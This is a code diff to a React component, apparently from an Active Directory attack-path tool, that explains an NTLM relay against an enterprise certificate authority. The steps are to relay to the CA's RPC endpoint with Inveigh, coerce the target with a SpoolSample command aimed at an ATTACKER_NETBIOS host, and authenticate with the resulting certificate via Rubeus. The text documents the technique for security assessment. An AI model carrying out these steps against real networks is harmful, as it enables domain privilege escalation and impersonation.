@@ -23,11 +23,11 @@ const WindowsAbuse: FC<EdgeInfoProps> = () => {
         <>
             <Typography variant={'body1'}>1. Start the Relay Server</Typography>
             <Typography variant={'body2'}>
-                The NTLM relay can be executed with{' '}
+                The NTLM relay can be executed with tools like{' '}
                 <Link target='_blank' rel='noopener' href='https://github.com/Kevin-Robertson/Inveigh'>
                     Inveigh
                 </Link>
-                , targeting the HTTP(S) endpoint of the enterprise CA server.
+                , targeting the RPC endpoint of the enterprise CA server.
             </Typography>
             <Typography variant={'body1'}>2. Coerce the Target Computer</Typography>
             <Typography variant='body2'>
@@ -57,6 +57,14 @@ const WindowsAbuse: FC<EdgeInfoProps> = () => {
                 Connection String format: <code>\\SERVER_NETBIOS@PORT/PATH/TO/FILE</code>. Example:
             </Typography>
             <Typography component={'pre'}>{'SpoolSample.exe "VICTIM_IP" "ATTACKER_NETBIOS@PORT/file.txt"'}</Typography>
+            <Typography variant={'body1'}>3. Perform Certificate Authentication</Typography>
+            <Typography variant='body2'>
+                Authenticate using the certificate obtained as the target principal, for example by using{' '}
+                <Link target='_blank' rel='noopener' href='https://github.com/GhostPack/Rubeus'>
+                    Rubeus
+                </Link>
+                .
+            </Typography>
         </>
     );
 };
